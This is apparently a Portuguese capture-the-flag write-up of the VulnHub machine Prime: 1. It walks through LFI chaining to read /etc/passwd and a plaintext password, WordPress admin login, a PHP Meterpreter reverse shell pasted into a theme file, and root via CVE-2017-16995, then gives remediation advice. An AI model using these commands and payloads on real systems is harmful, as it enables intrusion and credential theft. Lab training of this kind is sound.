# Prime: 1 — Siga as Pistas, Encontre o Root

Bora rapaziada!! Prime: 1 é uma máquina seriamente subestimada para aprender encadeamento de LFI. Todo o caminho é guiado por dicas: um secret.txt aponta para um nome de parâmetro, esse parâmetro lê arquivos internos, um arquivo vaza credenciais, essas credenciais te levam ao WordPress, e um arquivo de tema gravável vira seu shell. Exploit de kernel finaliza. Cada passo é uma migalha que te ensina a ler o ambiente em vez de atacá-lo cegamente. Design top demais, véi.

Salve ao Sunil Chouhan por construir uma máquina onde cada dica parece conquistada. É exatamente o tipo de ambiente que constrói o hábito de "ler antes de executar".

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | Prime: 1 |
| **VM Atacante** | Kali Linux 2024.x |
| **URL VulnHub** | https://www.vulnhub.com/entry/prime-1,358/ |
| **Técnicas** | Enumeração de diretórios web, encadeamento LFI (dois parâmetros separados), extração de credencial do diretório home do usuário, login no admin WordPress, injeção PHP em tema gravável, Meterpreter PHP no Metasploit, exploit de kernel (BPF sign-extension) |
| **CVEs** | CVE-2017-16995 (escalada de privilégios BPF sign-extension no kernel Linux) |
| **Grupos APT** | Lazarus Group (visa instalações WordPress e CMS para acesso inicial em setores financeiro e criativo); APT28 (usa LFI e coleta de credenciais para movimento lateral em infraestrutura web) |

---

## Resumo do Ataque

```
nmap → SSH (22), HTTP (80)
  → dirb → /WordPress, /dev/, secret.txt
  → curl secret.txt → dica: parâmetro "file" no index.php
  → http://alvo/index.php?file=location.txt → revela parâmetro secrettier360 em /image.php
  → http://alvo/image.php?secrettier360=/etc/passwd → usuário: saket
  → http://alvo/image.php?secrettier360=/home/saket/password.txt → follow_the_ippsec
  → http://alvo/WordPress/wp-login.php → victor:follow_the_ippsec
  → Aparência > Editor de Tema > secret.php → gravável
  → msfvenom PHP meterpreter → colar em secret.php → salvar
  → Metasploit multi/handler → acionar URL → sessão Meterpreter
  → cat /home/saket/user.txt
  → uname -a → kernel 4.10.0-28 → CVE-2017-16995
  → use exploit/linux/local/bpf_sign_extension_priv_esc → sessão 2 root
  → cat /root/root.txt
```

---

## Metodologia

1. Scan completo de portas: identificar SSH (22) e HTTP (80)
2. Enumeração de diretórios com dirb: encontrar WordPress, /dev/, secret.txt
3. LFI #1: parâmetro index.php?file= revelado via dica do secret.txt
4. LFI #2: parâmetro image.php?secrettier360= revelado via location.txt
5. Leitura de /etc/passwd e /home/saket/password.txt via LFI #2
6. Login no WordPress como victor com senha extraída
7. Localizar arquivo de tema gravável (secret.php)
8. Injeção de payload PHP Meterpreter via editor de tema
9. Captura da flag de usuário
10. Verificação da versão do kernel: vulnerável ao CVE-2017-16995
11. Exploit BPF do Metasploit para root
12. Captura da flag root

---

## Passo 1 — Descoberta da Rede e Scan de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
# Alvo: 192.168.1.101

nmap -A 192.168.1.101
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Dois serviços: SSH e HTTP. Enumeração web vem primeiro.

---

## Passo 2 — Enumeração Web com dirb

```bash
dirb http://192.168.1.101
```

Achados principais:

```
http://192.168.1.101/WordPress/     [instalação WordPress]
http://192.168.1.101/dev/           [listagem de diretório]
http://192.168.1.101/secret.txt     [arquivo texto plano]
```

Ler `secret.txt`:

```bash
curl http://192.168.1.101/secret.txt
```

Conteúdo: uma dica referenciando um link do GitHub e a palavra **"file"** como nome de parâmetro. A dica está te dizendo para tentar `?file=` em `index.php`.

Também: executar com busca de extensão de texto:

```bash
dirb http://192.168.1.101/ -X .txt
```

Verificar WordPress para usuários:

```bash
wpscan --url http://192.168.1.101/WordPress/ --enumerate u
# Usuário descoberto: victor (visível nos metadados do autor do post)
```

---

## Passo 3 — LFI #1: Parâmetro index.php?file=

A dica do `secret.txt` diz para tentar o parâmetro `file` em `index.php`:

```
http://192.168.1.101/index.php?file=location.txt
```

A resposta inclui o conteúdo de `location.txt`:

```
Eu sei que você está procurando pela chave, mas não está aqui.
Tente o parâmetro secrettier360 em /image.php
```

Perfeito. Dois pontos confirmados: LFI existe em `index.php`, e o próximo passo usa um parâmetro diferente em uma página diferente.

**Nota do mundo real:** Vulnerabilidades LFI em aplicações PHP permitem que um atacante inclua arquivos do sistema de arquivos do servidor na resposta HTTP. Mesmo arquivos fora do web root podem ser lidos. Isso é CWE-22 (Path Traversal) e CWE-98. Essas vulnerabilidades são consistentemente encontradas em aplicações PHP customizadas e temas de CMS mal configurados. APT28 usa LFI como trampolim para extração de credenciais.

---

## Passo 4 — LFI #2: Parâmetro image.php?secrettier360=

```bash
# Confirmar LFI em image.php
curl "http://192.168.1.101/image.php?secrettier360=/etc/passwd"
```

`/etc/passwd` é retornado. Usuário notável: **saket** com diretório home em `/home/saket`.

Agora ler o arquivo de senha do saket diretamente:

```bash
curl "http://192.168.1.101/image.php?secrettier360=/home/saket/password.txt"
```

```
follow_the_ippsec
```

Credenciais extraídas: `victor` / `follow_the_ippsec` (o usuário do WordPress, a senha do diretório home do saket via LFI).

**Nota do mundo real:** Armazenar senhas em texto puro em arquivos dentro de diretórios home de usuários é uma falha de segurança óbvia, mas aparece regularmente em ambientes com práticas pobres de gerenciamento de credenciais.

---

## Passo 5 — Login no WordPress como victor

```
URL: http://192.168.1.101/WordPress/wp-login.php
Usuário: victor
Senha: follow_the_ippsec
```

Login bem-sucedido. Dashboard admin acessível.

Navegar para **Aparência > Editor de Tema > Selecionar Tema: twentynineteen > secret.php**

O arquivo `secret.php` é gravável (verificado pela função de salvar que não retorna erro em edição de teste).

---

## Passo 6 — Payload PHP Meterpreter via Arquivo de Tema Gravável

Gerar payload PHP Meterpreter:

```bash
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=192.168.1.106 \
    LPORT=4444 \
    -f raw > /tmp/shell_payload.php
```

Copiar o código PHP gerado de `/tmp/shell_payload.php`. No editor de tema do WordPress, colar o payload inteiro em `secret.php` e clicar em **Atualizar Arquivo**.

Iniciar o handler do Metasploit:

```bash
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.1.106
set LPORT 4444
exploit
```

Acionar o shell navegando para:

```
http://192.168.1.101/WordPress/wp-content/themes/twentynineteen/secret.php
```

Sessão Meterpreter abre como `www-data`.

```bash
# No Meterpreter
shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

cat /home/saket/user.txt
```

---

## Passo 7 — Escalada de Privilégios: Exploit de Kernel (CVE-2017-16995)

Verificar a versão do kernel:

```bash
uname -a
# Linux prime 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Aug 3 10:01:16 UTC 2017 x86_64
```

Kernel 4.10.0-28 no Ubuntu 16.04 é vulnerável ao **CVE-2017-16995** — escalada de privilégios BPF (Berkeley Packet Filter) sign-extension. O Metasploit tem um módulo para isso:

```bash
# No Metasploit (deixar a sessão meterpreter em background primeiro)
background  # ou Ctrl+Z

use exploit/linux/local/bpf_sign_extension_priv_esc
set session 1
set LHOST 192.168.1.106
exploit
```

Sessão 2 abre como root.

```bash
# Na sessão 2
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. O número primo desta máquina é 0 (root).

**Nota do mundo real:** Kernels Linux sem patch continuam sendo um dos caminhos de escalada de privilégios mais confiáveis. Ubuntu 16.04 chegou ao fim da vida útil em abril de 2021, ou seja, todas as instalações restantes carregam múltiplos CVEs de kernel sem patch. CVE-2017-16995 afeta especificamente o verificador eBPF. Lazarus Group e APT28 usam exploits de kernel local como caminho de escalada alternativo quando outros métodos falham.

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Usuário WordPress | victor | Metadados do autor via wpscan | Login WordPress |
| Senha | follow_the_ippsec | /home/saket/password.txt via LFI | Login admin WordPress |
| Sessão Meterpreter | www-data | Arquivo de tema gravável (secret.php) | Acesso shell |
| Flag Usuário | user.txt | /home/saket/user.txt | Capturada via shell Meterpreter |
| Flag Root | root.txt | /root/root.txt | Capturada após exploit de kernel |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Aprendizado Chave |
|---|---|---|---|
| 1 | LFI encadeado em dois endpoints: descoberta de parâmetro por dica | LFI em apps PHP com múltiplos pontos de entrada permite extração completa de credenciais | Validar e colocar na whitelist todos os parâmetros de inclusão de arquivo; evitar caminhos controlados pelo usuário |
| 2 | Senha em texto puro em /home/saket/password.txt | Arquivos de credenciais em diretórios home são expostos por qualquer LFI, SSRF ou XXE | Nunca armazenar credenciais em arquivos texto; usar gerenciador de segredos ou vault |
| 3 | Arquivo de tema WordPress gravável pelo www-data: execução de código | Qualquer arquivo PHP gravável no web root é um vetor de execução de código | Definir permissões restritas nos diretórios de tema e plugin do WordPress; usar mounts somente leitura |
| 4 | Kernel 4.10.0-28 sem patch: CVE-2017-16995 | Versões de SO em fim de vida útil carregam múltiplos CVEs de kernel sem patch | Aplicar atualizações de segurança; monitorar feeds de CVE do kernel; migrar de SOs EOL |
| 5 | Caminho de ataque guiado por dicas (secret.txt → location.txt → nome do parâmetro) | Aplicações reais às vezes deixam comentários, dicas ou arquivos de debug em produção | Remover todos os arquivos de debug/dica/dev antes do deploy; automatizar detecção no pipeline CI/CD |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso | Credenciais em Arquivos | T1552.001 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso | Contas Válidas | T1078 |
| Execução | Execução | Interpretador: Shell Unix | T1059.004 |
| Persistência | Persistência | Web Shell | T1505.003 |
| Escalada de Privilégios | Escalada | Exploração para Escalada de Privilégios | T1068 |
| Escalada de Privilégios | Escalada | Abuso de Mecanismo de Controle de Elevação | T1548 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Corrigir LFI em index.php e image.php**: validar e colocar na whitelist os parâmetros `file` e `secrettier360`; usar mapeamento de arquivos permitidos em vez de inclusão direta de caminho
2. **Remover /home/saket/password.txt**: nunca armazenar credenciais em texto puro; usar gerenciador de segredos
3. **Definir permissões corretas nos diretórios de tema WordPress**: `chmod -R 755 wp-content/themes/`; sem permissão de escrita para www-data
4. **Remover secret.txt, location.txt, diretório dev**: nenhum arquivo de debug ou dica no web root de produção
5. **Aplicar atualizações do kernel**: fazer upgrade do Ubuntu 16.04 (EOL); aplicar patch para LTS atual; habilitar atualizações de segurança automáticas
6. **Impor senhas fortes de usuário WordPress**: `follow_the_ippsec` é uma frase de palavras reais; usar um gerador de senhas

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todas as aplicações PHP com funcionalidade de inclusão de arquivo |
| Proteger | Controle de Acesso | Corrigir LFI; definir permissões estritas de diretório web |
| Proteger | Segurança de Dados | Sem credenciais em texto puro em arquivos; gerenciador de segredos |
| Detectar | Anomalias e Eventos | Alertar sobre tentativas LFI (padrões de path traversal nos logs web) |
| Responder | Planejamento de Resposta | Remover webshells do diretório de tema; rotacionar credenciais |
| Recuperar | Planejamento de Recuperação | Fazer upgrade do SO; aplicar patch no kernel; restaurar de backup limpo |

---

## Considerações Finais

Prime: 1 ensina um dos hábitos mais importantes em testes de penetração web: ler o ambiente antes de executar ferramentas. Cada passo nessa máquina te deu exatamente o que você precisava para prosseguir, se leu com atenção suficiente. `secret.txt` disse o parâmetro. `location.txt` disse o próximo parâmetro. LFI disse a senha. A senha te levou ao WordPress. O editor de tema te deu o shell. A versão do kernel te deu root.

Essa abordagem sistemática de seguir pistas é exatamente como pentesters experientes se movem por um engajamento. Força bruta não te leva a lugar nenhum aqui. Observação leva.

GG mano, siga o ippsec. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
